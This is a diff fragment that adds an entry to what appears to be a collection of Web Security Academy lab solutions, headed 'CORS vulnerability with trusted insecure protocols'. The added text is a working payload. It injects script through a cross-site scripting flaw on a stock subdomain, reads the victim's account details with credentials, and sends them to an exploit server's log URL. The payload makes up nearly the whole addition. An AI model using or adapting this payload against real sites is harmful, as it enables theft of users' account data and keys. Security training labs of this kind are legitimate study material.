@@ -126,3 +126,13 @@ Access-Control-Allow-Origin: null
   };
 </script>"></iframe>
 
+===
+
+CORS vulnerability with trusted insecure protocols
+
+// example payload:
+<script>
+  document.location="http://stock.0a7d002c04678ebc80270daf00f200be.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a7d002c04678ebc80270daf00f200be.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a26001b043c8ebe80a50ce201f2004c.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+
+
